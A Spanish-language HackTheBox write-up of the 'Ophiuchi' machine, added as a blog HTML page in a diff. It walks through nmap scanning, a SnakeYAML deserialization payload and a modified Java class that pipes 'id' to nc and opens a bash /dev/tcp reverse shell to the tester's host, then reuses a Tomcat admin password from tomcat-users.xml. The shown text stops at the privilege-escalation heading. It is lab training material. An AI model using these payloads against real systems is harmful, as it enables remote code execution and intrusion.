@@ -1,0 +1,1492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Ophiuchi</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Ophiuchi | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Ophiuchi" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel medio. La deserialización no puede faltar, pero esta vez parseando sintaxis YAML. Enumeración básica y finalmente tendremos que jugar con instrucciones de WebAssembly para modificar una constante traviesa. Con esto conseguiremos ejecutar un archivo que nos permitirá obtener una Shell como root." />
+<meta property="og:description" content="Máquina Linux nivel medio. La deserialización no puede faltar, pero esta vez parseando sintaxis YAML. Enumeración básica y finalmente tendremos que jugar con instrucciones de WebAssembly para modificar una constante traviesa. Con esto conseguiremos ejecutar un archivo que nos permitirá obtener una Shell como root." />
+<link rel="canonical" href="http://localhost:4000/htb/ophiuchi" />
+<meta property="og:url" content="http://localhost:4000/htb/ophiuchi" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-03T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315banner.png" />
+<meta property="twitter:title" content="HackTheBox - Ophiuchi" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-03T00:00:00-07:00","datePublished":"2021-07-03T00:00:00-07:00","description":"Máquina Linux nivel medio. La deserialización no puede faltar, pero esta vez parseando sintaxis YAML. Enumeración básica y finalmente tendremos que jugar con instrucciones de WebAssembly para modificar una constante traviesa. Con esto conseguiremos ejecutar un archivo que nos permitirá obtener una Shell como root.","headline":"HackTheBox - Ophiuchi","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/ophiuchi"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/ophiuchi"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Ophiuchi</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-03">03 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315banner.png" alt="HackTheBox - Ophiuchi">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel medio. La <strong>deserialización</strong> no puede faltar, pero esta vez parseando sintaxis <strong>YAML</strong>. Enumeración básica y finalmente tendremos que jugar con instrucciones de <strong>WebAssembly</strong> para modificar una constante traviesa. Con esto conseguiremos ejecutar un archivo que nos permitirá obtener una Shell como root.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315ophiuchiHTB.png" alt="315ophiuchiHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/27390">felamos</a>.</p>
+
+<p>Ejejeyyy ¿cómo estás?</p>
+
+<p>Listoooos a darle, nos encontraremos con un analizador/parseador/formateador/etc de sintaxis <strong>YAML</strong>, buscando vulnerabilidades relacionadas a ese proceso, nos topamos con una deserialización en <strong>SnakeYAML</strong> que nos permite ejecución remota de comandos… Aprovechándonos de ella obtendremos una Shell como el usuario <strong>tomcat</strong>.</p>
+
+<p>Enumerando la estructura base de <strong>tomcat</strong> tendremos el archivo <code>tomcat-users.xml</code>, donde obtendremos las credenciales del usuario <strong>admin</strong> hacia <strong>tomcat</strong>, pero reusándolas podremos tener ahora una sesión como <strong>admin</strong>.</p>
+
+<p>Para la escalada, nos encontraremos con que <strong>admin</strong> puede ejecutar en la máquina mediante <code>sudo</code> un programa creado en el lenguaje de programación <strong>Go</strong>. En su contenido hay dos archivos que están siendo llamados de forma relativa, por lo que al ejecutar el programa los tomara de la ruta en la que estemos situados. Uno de ellos abarca <strong>WebAssembly</strong>, tendremos que modificar su ejecución para lograr correr el otro programa (<code>deploy.sh</code>).</p>
+
+<p>Para la modificación usaremos la herramienta <a href="https://github.com/WebAssembly/wabt">wabt</a>, jugaremos con archivos <code>.wasm</code> y <code>.wat</code>. Finalmente cambiamos el contenido de <code>deploy.sh</code> para que nos genere una Reverse Shell como el usuario <strong>root</strong>.</p>
+
+<p>A darle candela (:</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Tiene tintes de realidad.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral">Movimiento Lateral</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Realizaremos un escaneo de puertos para saber que servicios esta corriendo la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.227 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me permite extraer los puertos y guardarlos en la clipboard, esto para evitar copiar uno a uno (en caso de tener muchos) a mano en nuestro siguiente escaneo.</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.227
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.227 ()   Status: Up
+Host: 10.10.10.227 ()   Ports: 22/open/tcp//ssh///, 8080/open/tcp//http-proxy///
+# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 142.74 seconds
+</code></pre>
+
+<p>Perfecto, nos encontramos los servicios:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Acceso remoto a servidores por medio de un canal seguro.</td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Servidor_proxy">HTTP Proxy</a></strong>: Intermediario entre peticiones web.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos información más detallada de cada uno:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,8080 -sC -sV 10.10.10.227 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos.</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio.</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio.</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo.</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p 22,8080 -sC -sV -oN portScan 10.10.10.227
+Nmap scan report for 10.10.10.227
+Host is up (0.19s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.26 seconds
+</code></pre>
+
+<p>Bien, tenemos varias cositas:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">8080</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache Tomcat 9.0.38</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Que destacamos:</p>
+
+<p><strong>Puerto 8080:</strong></p>
+
+<blockquote>
+  <p><strong>Apache Tomcat</strong>: Contenedor de clases usadas para ampliar la capacidad de un servidor (servlets), que nos permite compilar y ejecutar aplicaciones web realizadas en <strong>Java</strong>.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://es.wikipedia.org/wiki/Java_Servlet">Java Servlet - Wikipedia</a>.</li>
+  <li><a href="https://www.hostdime.com.ar/blog/que-es-apache-tomcat/">¿Qué es Apache Tomcat?</a>.</li>
+</ul>
+
+<p>Bueno, empecemos a validar cada servicio y ver por donde podemos jugar…</p>
+
+<p>…</p>
+
+<h3 id="puerto-8080">Puerto 8080 <a href="#puerto-8080">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315page8080.png" alt="315page8080" /></p>
+
+<p>Tenemos un analizador de formato <a href="https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html">YAML</a>, interactuemos con él:</p>
+
+<blockquote>
+  <p><strong>YAML (Yet Another Markup Language)</strong>: Formato hecho para nosotros e.e Cosa que podamos facilmente leer lo que este pasando.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://geeks.ms/jorge/2019/03/21/yaml-ventajas-desventajas-y-cuando-usarlo/">Desventajas, ventajas y uso de YAML</a>.</li>
+</ul>
+
+<p>Si agregamos cualquier cosa, nos redirecciona al apartado <code>Servlet</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315page8080_Servlet.png" alt="315page8080_Servlet" /></p>
+
+<p>Jmmm interesante, investiguemos como podemos interactuar con esto…</p>
+
+<p>Bueno, leyendo sobre <code>YAML exploit</code> nos encontramos con un artículo muy llamativo hablando sobre deserialización insegura en él parseo de archivos <code>YAML</code>. Pero antes, que es deserialización rápidamente:</p>
+
+<blockquote>
+  <p>Deserialización: Proceso por el cual pasan un conjunto de bytes para convertirse en un objeto entendible. La serialización seria pasar ese objeto a bytes para almacenarlos en memoria, a bases de datos, etc.</p>
+</blockquote>
+
+<p>En la deserialización es donde esta la vulnerabilidad, ya que intentara pasar los bytes a objetos y ahí es donde podemos decirle que haga lo que queramos.</p>
+
+<ul>
+  <li><a href="https://seguridad-ofensiva.com/blog/owasp-top-10/owasp-top-8/">Deserialización insegura</a>.</li>
+  <li><a href="https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/">Aprende que es deserialización insegura</a>.</li>
+</ul>
+
+<p>Ahora, volviendo al artículo (dire mucho «articulo» en esta sección :P):</p>
+
+<ul>
+  <li><a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858">SnakeYaml Deserialization exploited</a>.</li>
+</ul>
+
+<p>Nos habla de una deserialización insegura en la cual podemos conseguir <strong>RCE</strong> en la máquina que lo esté corriendo. Profundicemos en la explicación:</p>
+
+<p>Básicamente es explotada cuando una página tiene la funcionalidad de parsear (formatear/analizar) un archivo o sintaxis <code>YAML</code>. Si el proceso directamente en el input genera él parseo llamando la función <code>yaml.load</code> sin previa sanitización, podemos conseguir ejecucion remota de comandos en el sistema. El artículo nos muestra como sería la definición de la función <code>yaml.load</code> en la lógica:</p>
+
+<pre><code class="language-java">Yaml yaml = new Yaml();
+Object obj = yaml.load(&lt;--user input data--&gt;);
+</code></pre>
+
+<p>¿Pero como podemos validar que efectivamente podemos explotar esta deserialización? Bien, el creador del artículo uso un payload de un <code>pdf</code> el cual nos ayuda con esto:</p>
+
+<pre><code class="language-yml">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://attacker-ip/"]
+  ]]
+]
+</code></pre>
+
+<p>Primero debemos levantar un servidor web, usaré <code>Python</code>:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Ahora en la web colocamos el payload, cambiamos nuestra IP y puerto y vemos si obtenemos alguna petición:</p>
+
+<pre><code class="language-yml">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.14.51:8000/"]
+  ]]
+]
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.227 - - [18/Feb/2021 12:12:12] code 404, message File not found
+10.10.10.227 - - [18/Feb/2021 12:12:12] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
+</code></pre>
+
+<p>Bien, validamos que el payload funciona y podemos empezar a jugar para explotar esto. Vemos que esta intentando entrar a una ruta, pero al no tenerla en nuestra máquina, claramente recibe un código de estado <code>404</code>.</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Vale, el artículo nos redirecciona a los CVE respectivos de la vulnerabilidad:</p>
+
+<ul>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000207">CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution</a>.</li>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000208">CVE-2017-1000208 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution</a>.</li>
+</ul>
+
+<blockquote>
+  <p>“The snake YAML has a feature which supports for a special syntax that allows the constructor of any Java class to be called when parsing YAML data which is <code>(!!&lt;java class constructor&gt;)</code>” <a href="https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858">SnakeYaml Deserialization exploited</a>.</p>
+</blockquote>
+
+<p>Perfecto, entonces al pasarle nuestro payload, <code>Snake YAML</code> llamara el constructor <code>ScriptEngineFactory</code> que hará una petición hacia nuestra máquina.</p>
+
+<p>Para aprovecharnos de esto el artículo nos provee con un repositorio que genera payloads para ejecutar código en el sistema:</p>
+
+<ul>
+  <li><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a>.</li>
+</ul>
+
+<p>Entonces, despues de clonarnos el repo, vemos que ya tiene la estructura a la que el servidor intenta entrar: <code>/META-INF/services/javax.script.ScriptEngineFactory</code>.</p>
+
+<pre><code class="language-bash">❭ tree
+.
+├── artsploit
+│   └── AwesomeScriptEngineFactory.java
+└── META-INF
+    └── services
+        └── javax.script.ScriptEngineFactory
+
+3 directories, 2 files
+</code></pre>
+
+<p>Entonces, la idea es que el exploit (<code>AwesomeScriptEngineFactory.java</code>) nos genere el payload (terminara en <code>.class</code> y estará junto al <code>.java</code>) para posteriormente desde la web hacer la petición a la que esta vez debería encontrar la ruta <code>/META-INF/...</code>, leerá el archivo <code>javax.script.ScriptEngineFactory</code> el cual por dentro apunta a nuestro payload (el <code>.class</code>) que sería ejecutado en el sistema :)</p>
+
+<p>Modifiquemos el archivo <code>.java</code> para generar el <code>.class</code>. El original ejecuta una calculadora en <code>mac</code>:</p>
+
+<pre><code class="language-java">...
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+                                                
+    public AwesomeScriptEngineFactory() {                                                       
+        try {                        
+            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
+            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator"); 
+        } catch (IOException e) {               
+            e.printStackTrace();                                                                
+        }                               
+    }
+...
+</code></pre>
+
+<p>Cambiémoslo para que nos haga una petición hacia el puerto <code>4433</code> con <code>nc</code>:</p>
+
+<pre><code class="language-java">...
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec("nc 10.10.14.51 4433");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+...
+</code></pre>
+
+<p>Ahora compilémoslo:</p>
+
+<pre><code class="language-bash">❭ javac AwesomeScriptEngineFactory.java
+</code></pre>
+
+<pre><code class="language-bash">❭ ls 
+AwesomeScriptEngineFactory.class  AwesomeScriptEngineFactory.java
+</code></pre>
+
+<ul>
+  <li><a href="https://es.quora.com/En-Java-qu%C3%A9-es-un-archivo-class">¿Qué es un archivo <strong>.class</strong> en <strong>Java</strong>?</a>.</li>
+</ul>
+
+<p>Nos ponemos en escucha en <code>Python</code> y en <code>nc</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315bash_listener_ncYpy.png" alt="315bash_listener_ncYpy" /></p>
+
+<p>Ahora vamos a la web y volvemos a ejecutar el payload inicial que apunta hacia nuestra máquina. En nuestro servidor en <code>Python</code> recibimos:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.227 - - [18/Feb/2021 13:13:13] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
+10.10.10.227 - - [18/Feb/2021 13:13:13] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
+10.10.10.227 - - [18/Feb/2021 13:13:13] "GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1" 200 -
+</code></pre>
+
+<p>Perfecto y si esperamos un momento en nuestro listener de <code>nc</code> tenemos:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+10.10.10.227: inverse host lookup failed: Host name lookup failure
+connect to [10.10.14.51] from (UNKNOWN) [10.10.10.227] 48976
+</code></pre>
+
+<p>Vale vale, tamo bieeen. Tenemos ejecución remota de comandos en el sistema, intentemos ahora saber que usuario somos (además que nos sirve para validar si podemos ejecutar varios comandos sin problemas):</p>
+
+<pre><code class="language-java">...
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec("id | nc 10.10.14.51 4433");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+...
+</code></pre>
+
+<p>Compilamos, escuchamos y ejecutamos en la web, en <code>Python</code> todo correctísimo, pero en <code>nc</code> no recibimos nada… Jugando con la sintaxis no logre nada, asi que podemos tomar el <code>Runtime.getRuntime().exec()</code> y buscar como ejecutar comandos en <code>linux</code> con él. Obtuvimos una charlita:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/12097095/java-exec-linux-command">Stackoverflow - Java Exec Linux Command</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315google_stackoverflow_java_linux_command.png" alt="315google_stackoverflow_java_linux_command" /></p>
+
+<p>Bien, probemos con esa sintaxis:</p>
+
+<pre><code class="language-java">...
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+
+            String [] cmd = {
+                "/bin/sh",
+                "-c",
+                "id | nc 10.10.14.51 4433"
+            };
+
+            Runtime.getRuntime().exec(cmd);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+...
+</code></pre>
+
+<p>Yyyyyyyyyyy:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+10.10.10.227: inverse host lookup failed: Host name lookup failure
+connect to [10.10.14.51] from (UNKNOWN) [10.10.10.227] 48990
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+</code></pre>
+
+<p>Perfecto (muchas gracias <code>@Randall</code> por tu respuesta de hace 9 años 😄), somos el usuario <strong>tomcat</strong>, ahora si intentemos generar una Reverse Shell:</p>
+
+<p><em>(Despues de algunas pruebas fallidas claramente)</em></p>
+
+<pre><code class="language-bash">...
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+
+            String [] cmd = {
+                "/bin/sh",
+                "-c",
+                "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4433 0&gt;&amp;1'"
+            };
+
+            Runtime.getRuntime().exec(cmd);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+...
+</code></pre>
+
+<p>Y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315bash_revSH_tomcat.png" alt="315bash_revSH_tomcat" /></p>
+
+<p>Perfectoooooooooooo, tamos dentro papachooooooooooooo.</p>
+
+<p>Bueno, antes de seguir hagamos tratamiento de la TTY (Shell) para poder tener historial de comandos con las flechas, dar <code>CTRL + C</code> sin miedo y demás cositas, solo debemos escribir lo siguiente:</p>
+
+<pre><code class="language-bash">tomcat@ophiuchi:/$ script /dev/null -c bash
+(CTRL + Z)
+❭ stty raw -echo
+❭ fg #(asi no lo veas se esta escribiendo)
+        reset
+Terminal type? xterm
+tomcat@ophiuchi:/$ export TERM=xterm
+tomcat@ophiuchi:/$ export SHELL=bash
+tomcat@ophiuchi:/$ stty rows 43 columns 192 #(Este depende del tamano de tu pantalla (`$ stty -a`))
+</code></pre>
+
+<p>Y listo hemos hecho el tratamiento de la TTY perfectamente.</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">Savitar nos lo explica gráficamente en varios videos</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral">Movimiento lateral <a href="#movimiento-lateral">#</a></h2>
+
+<p>Ahora si a enumerar… La flag de <code>user</code> esta en el <code>/home</code> del usuario <code>admin</code>, pero no tenemos acceso a verla aún:</p>
+
+<pre><code class="language-bash">tomcat@ophiuchi:~$ ls /home/
+admin
+tomcat@ophiuchi:~$ ls /home/admin/
+user.txt
+tomcat@ophiuchi:~$ cat /home/admin/user.txt 
+cat: /home/admin/user.txt: Permission denied 
+tomcat@ophiuchi:~$ 
+</code></pre>
+
+<p>Si recordamos la estructura de <code>tomcat</code> sabemos que existe un archivo donde a veces se almacenan las credenciales de los usuarios que manejen el servidor <code>tomcat</code>:</p>
+
+<blockquote>
+  <p>Los nombres de usuario y las contraseñas cifradas se almacenan en el archivo tomcat-users.xml. Las actualizaciones tales como la creación de un usuario y el cambio de contraseñas de usuario o de los roles de permisos de repositorio se escriben automáticamente en archivo XML. <a href="https://www.ibm.com/support/knowledgecenter/es/SSYMRC_6.0.4/com.ibm.jazz.install.doc/topics/c_plan_jazz_user_management.html">IBM - Gestion de usuarios Apache Tomcat</a></p>
+</blockquote>
+
+<p>Validando su existencia:</p>
+
+<pre><code class="language-bash">tomcat@ophiuchi:~$ ls -la conf/
+total 240
+drwxr-x--- 2 root tomcat   4096 Dec 28 00:37 .
+drwxr-xr-x 9 root tomcat   4096 Oct 11 14:07 ..
+-rw-r----- 1 root tomcat  12873 Sep 10 08:25 catalina.policy
+-rw-r----- 1 root tomcat   7262 Sep 10 08:25 catalina.properties
+-rw-r----- 1 root tomcat   1400 Sep 10 08:25 context.xml
+-rw-r----- 1 root tomcat   1149 Sep 10 08:25 jaspic-providers.xml
+-rw-r----- 1 root tomcat   2313 Sep 10 08:25 jaspic-providers.xsd
+-rw-r----- 1 root tomcat   4144 Sep 10 08:25 logging.properties
+-rw-r----- 1 root tomcat   7588 Sep 10 08:25 server.xml
+-rw-r----- 1 root tomcat   2234 Dec 28 00:37 tomcat-users.xml
+-rw-r----- 1 root tomcat   2558 Sep 10 08:25 tomcat-users.xsd
+-rw-r----- 1 root tomcat 172359 Sep 10 08:25 web.xml
+</code></pre>
+
+<p>Perfecto, si lo vemos detalladamente tenemos una credencial:</p>
+
+<pre><code class="language-bash">...
+&lt;user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/&gt;
+...
+</code></pre>
+
+<p>Probemos esa contraseña hacia la máquina, quizás podamos reusarla:</p>
+
+<pre><code class="language-bash">tomcat@ophiuchi:~$ su admin
+Password: 
+admin@ophiuchi:/opt/tomcat$
+</code></pre>
+
+<p>Perfecto, somos el usuario <code>admin</code>, ahora si veamos como convertirnos en <code>root</code>…</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
